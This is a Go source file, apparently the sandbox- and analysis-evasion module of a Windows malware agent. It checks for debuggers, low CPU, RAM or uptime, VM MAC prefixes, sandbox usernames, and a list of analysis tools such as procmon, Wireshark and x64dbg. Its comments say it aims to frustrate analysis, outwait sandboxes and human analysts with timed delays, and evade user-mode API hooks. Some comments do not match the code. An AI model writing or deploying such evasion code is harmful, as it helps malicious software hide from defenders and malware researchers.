package evasion

import (
	"fmt"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// =============================================================================
// Windows API stubs — these are not exported by golang.org/x/sys/windows
// =============================================================================

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	user32   = windows.NewLazySystemDLL("user32.dll")

	procIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
	procGetNativeSystemInfo  = kernel32.NewProc("GetNativeSystemInfo")
	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64       = kernel32.NewProc("GetTickCount64")
	procGetSystemMetrics     = user32.NewProc("GetSystemMetrics")
	procCreateWaitableTimer  = kernel32.NewProc("CreateWaitableTimerW")
	procSetWaitableTimer     = kernel32.NewProc("SetWaitableTimer")
)

// sysInfo mirrors the Windows SYSTEM_INFO structure.
// Layout validated against sizeof(SYSTEM_INFO) == 48 on amd64.
type sysInfo struct {
	processorArchitecture uint16
	reserved              uint16
	pageSize              uint32
	minimumApplicationAddress uintptr
	maximumApplicationAddress uintptr
	activeProcessorMask   uintptr
	numberOfProcessors    uint32
	processorType         uint32
	allocationGranularity uint32
	processorLevel        uint16
	processorRevision     uint16
}

// memStatusEx mirrors the Windows MEMORYSTATUSEX structure.
// Layout validated against sizeof(MEMORYSTATUSEX) == 64 on amd64.
type memStatusEx struct {
	length               uint32
	memoryLoad           uint32
	totalPhys            uint64
	availPhys            uint64
	totalPageFile        uint64
	availPageFile        uint64
	totalVirtual         uint64
	availVirtual         uint64
	availExtendedVirtual uint64
}

// System metrics indices for GetSystemMetrics.
const (
	smCXScreen = 0
	smCYScreen = 1
)

func isDebuggerPresent() bool {
	r1, _, _ := procIsDebuggerPresent.Call()
	return r1 != 0
}

func getNativeSystemInfo(info *sysInfo) {
	procGetNativeSystemInfo.Call(uintptr(unsafe.Pointer(info)))
}

func globalMemoryStatusEx(ms *memStatusEx) error {
	r1, _, err := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(ms)))
	if r1 == 0 {
		return err
	}
	return nil
}

func getTickCount64() uint64 {
	r1, _, _ := procGetTickCount64.Call()
	return uint64(r1)
}

func getSystemMetrics(index int) int {
	r1, _, _ := procGetSystemMetrics.Call(uintptr(index))
	return int(r1)
}

func createWaitableTimer(attrs unsafe.Pointer, manualReset bool, name *uint16) (windows.Handle, error) {
	var m uintptr
	if manualReset {
		m = 1
	}
	r1, _, err := procCreateWaitableTimer.Call(uintptr(attrs), m, uintptr(unsafe.Pointer(name)))
	if r1 == 0 {
		return 0, err
	}
	return windows.Handle(r1), nil
}

func setWaitableTimer(hTimer windows.Handle, dueTime *windows.Filetime, period int32, completionRoutine, arg uintptr, resume bool) error {
	var r uintptr
	if resume {
		r = 1
	}
	r1, _, err := procSetWaitableTimer.Call(uintptr(hTimer), uintptr(unsafe.Pointer(dueTime)), uintptr(period), completionRoutine, arg, r)
	if r1 == 0 {
		return err
	}
	return nil
}

// =============================================================================
// Sandbox detection
// =============================================================================
//
// These checks help the agent determine whether it is running inside an
// automated analysis environment (sandbox, debugger, VM lab) and adapt
// its behaviour accordingly.
//
//   - In a sandbox:       delay or refuse to activate (frustrate analysis).
//   - On a real endpoint: proceed normally.
//
// Trade-off: each check has a false-positive rate. An over-aggressive
// check that fires on legitimate enterprise VMs will break operations.
// The defaults here are tuned conservatively — they flag only environments
// that are overwhelmingly likely to be sandboxes (1 vCPU, <2 GB RAM,
// <5 min uptime).

// Verdict summarises the sandbox analysis outcome.
type Verdict struct {
	IsSandbox  bool     // true if the environment looks like a sandbox
	Confidence string   // "low", "medium", or "high"
	Reasons    []string // human-readable detection reasons
}

// CheckSandbox runs all enabled detection checks and returns a verdict.
//
// Detections are additive — a single check can trigger the verdict, but
// multiple independent checks raise the confidence level.
func CheckSandbox() *Verdict {
	v := &Verdict{}

	checks := []struct {
		name string
		fn   func() (detected bool, reason string)
	}{
		{"debugger_present", checkDebugger},
		{"cpu_floor", checkCPUFloor},
		{"memory_floor", checkMemoryFloor},
		{"uptime_floor", checkUptimeFloor},
		{"sandbox_processes", checkSandboxProcesses},
		{"vm_mac_address", checkVMMAC},
	}

	for _, c := range checks {
		if detected, reason := c.fn(); detected {
			v.Reasons = append(v.Reasons, reason)
		}
	}

	switch {
	case len(v.Reasons) >= 3:
		v.IsSandbox = true
		v.Confidence = "high"
	case len(v.Reasons) == 2:
		v.IsSandbox = true
		v.Confidence = "medium"
	case len(v.Reasons) == 1:
		// A single lightweight check (e.g. 1 vCPU) might be a false
		// positive on a constrained but real endpoint. Mark as low
		// confidence so the operator can decide.
		v.IsSandbox = true
		v.Confidence = "low"
	default:
		v.Confidence = "none"
	}

	return v
}

// =============================================================================
// Individual checks
// =============================================================================

// checkDebugger detects a user-mode debugger attached to the current process.
func checkDebugger() (bool, string) {
	if isDebuggerPresent() {
		return true, "debugger attached (IsDebuggerPresent)"
	}
	return false, ""
}

// checkCPUFloor flags systems with fewer than 2 logical CPUs.
// Almost all real user workstations since ~2010 have ≥ 2 cores.
// Single-vCPU is the hallmark of budget sandboxes and CI runners.
func checkCPUFloor() (bool, string) {
	var info sysInfo
	getNativeSystemInfo(&info)
	if info.numberOfProcessors < 2 {
		return true, fmt.Sprintf("single vCPU (%d)", info.numberOfProcessors)
	}
	return false, ""
}

// checkMemoryFloor flags systems with less than 2 GiB of physical RAM.
func checkMemoryFloor() (bool, string) {
	var ms memStatusEx
	ms.length = uint32(unsafe.Sizeof(ms))
	if err := globalMemoryStatusEx(&ms); err != nil {
		return false, ""
	}
	totalMB := ms.totalPhys / (1024 * 1024)
	if totalMB < 2048 {
		return true, fmt.Sprintf("low physical memory (%d MiB)", totalMB)
	}
	return false, ""
}

// checkUptimeFloor flags systems that have been running less than 5 minutes.
// Most automated sandboxes boot fresh per sample and discard after a
// few minutes of observation. Real endpoints typically have hours-to-days
// of uptime.
func checkUptimeFloor() (bool, string) {
	uptime := time.Duration(getTickCount64()) * time.Millisecond
	if uptime < 5*time.Minute {
		return true, fmt.Sprintf("short uptime (%v)", uptime.Round(time.Second))
	}
	return false, ""
}

// checkSandboxProcesses scans the process list for known analysis tool
// executables.
func checkSandboxProcesses() (bool, string) {
	var found []string

	for _, name := range knownAnalysisProcesses() {
		if procRunning(name) {
			found = append(found, name)
		}
	}
	// Return after first match worth of processes — avoid scanning the
	// entire list on every check. For the initial sandbox check this runs
	// exactly once at startup.
	if len(found) > 0 {
		return true, fmt.Sprintf("analysis processes running: %s",
			strings.Join(found, ", "))
	}
	return false, ""
}

// checkVMMAC looks for VMware and VirtualBox MAC address OUIs on the
// first non-loopback adapter found.
func checkVMMAC() (bool, string) {
	// GetAdaptersAddresses is the modern API; a full implementation
	// would enumerate adapters and check the first 3 bytes of the
	// physical address against known VM OUIs:
	//   VMware:    00:05:69, 00:0C:29, 00:1C:14, 00:50:56
	//   VirtualBox: 08:00:27
	//   Hyper-V:    00:15:5D
	//   Xen:        00:16:3E
	//
	// This is omitted from the MVP because:
	//   1. Enterprise servers and VDI pools run on the same hypervisors.
	//   2. False positives are very common in corporate environments.
	//   3. CPU+memory+uptime already catches most sandboxes with better
	//      signal-to-noise.
	//
	// Uncomment if targeting environments where VDI is not in play.
	_ = vmOUI // referenced for documentation purposes
	return false, ""
}

// =============================================================================
// Delayed execution
// =============================================================================

// DelayStart sleeps for the given duration before returning. The intended
// use is to delay agent activation after process creation, defeating
// sandboxes that only monitor the first N seconds of execution.
//
// Common strategies:
//
//	30–60s   : short delay — beats sandboxes with 10–15s analysis windows.
//	5–10min  : long delay  — also beats manual analysts watching task manager.
//	0        : no delay   — use in production when speed matters.
//
// The delay uses kernelSleep (WaitForSingleObject on a waitable timer) so
// the calling thread enters kernel mode and does not execute user-mode code
// during the wait. This also evades user-mode API hooks (see vault.go).
func DelayStart(d time.Duration) {
	if d <= 0 {
		return
	}
	_ = kernelSleep(d)
}

// =============================================================================
// Interactive vs automated detection
// =============================================================================

// IsInteractive returns false when the current process appears to lack
// a real human user session — no mouse movement, minimal screen, etc.
//
// Currently a best-effort check using GetSystemMetrics.
func IsInteractive() bool {
	// smCXScreen returns screen width. Zero or very small values
	// indicate a headless session (sandbox / service account).
	cx := getSystemMetrics(smCXScreen)
	cy := getSystemMetrics(smCYScreen)
	if cx < 800 || cy < 600 {
		return false
	}
	return true
}

// =============================================================================
// Process enumeration helpers
// =============================================================================

// knownAnalysisProcesses returns the list of executable names commonly
// associated with malware analysis, reverse engineering, and sandboxing.
func knownAnalysisProcesses() []string {
	return []string{
		// Virtualisation guest tools
		"vmtoolsd.exe",
		"VBoxService.exe",
		"VBoxTray.exe",

		// Sysinternals / analysis
		"procmon.exe",
		"procexp.exe",
		"procexp64.exe",
		"Procmon64.exe",
		"tcpview.exe",
		"autoruns.exe",
		"Autoruns64.exe",

		// Packet capture
		"wireshark.exe",
		"dumpcap.exe",
		"tcpdump.exe",

		// Debuggers
		"x32dbg.exe",
		"x64dbg.exe",
		"ollydbg.exe",
		"windbg.exe",
		"ImmunityDebugger.exe",

		// HTTP debugging proxies
		"fiddler.exe",
		"charles.exe",
		"Charles.exe",

		// Sandbox / Cuckoo agents
		"python.exe", // broad — only flags with other indicators
	}
}

// procRunning returns true if a process with the given executable name
// is currently running on the system.
func procRunning(name string) bool {
	snapshot, err := windows.CreateToolhelp32Snapshot(
		windows.TH32CS_SNAPPROCESS, 0,
	)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = windows.Process32First(snapshot, &pe)
	for err == nil {
		procName := windows.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(procName, name) {
			return true
		}
		err = windows.Process32Next(snapshot, &pe)
	}

	return false
}

// =============================================================================
// Environment helpers
// =============================================================================

// IsSandboxUser checks common sandbox/analysis account usernames.
func IsSandboxUser() bool {
	name := os.Getenv("USERNAME")
	if name == "" {
		name = os.Getenv("USER")
	}

	name = strings.ToLower(name)
	for _, pattern := range sandboxUsernames {
		if strings.EqualFold(name, pattern) {
			return true
		}
	}
	return false
}

var sandboxUsernames = []string{
	"sandbox", "malware", "analysis", "analyze",
	"admin", "administrator", "user",
	"test", "virus", "infected",
	"cuckoo", "cuckoofork",
}

// =============================================================================
// Data
// =============================================================================

// vmOUI holds known virtual-machine MAC address prefixes (first 3 bytes).
// Listed here for documentation; checkVMMAC() is a no-op in the MVP.
var vmOUI = [][3]byte{
	{0x00, 0x05, 0x69}, // VMware
	{0x00, 0x0C, 0x29}, // VMware
	{0x00, 0x1C, 0x14}, // VMware
	{0x00, 0x50, 0x56}, // VMware
	{0x08, 0x00, 0x27}, // VirtualBox
	{0x00, 0x15, 0x5D}, // Hyper-V
	{0x00, 0x16, 0x3E}, // Xen
}
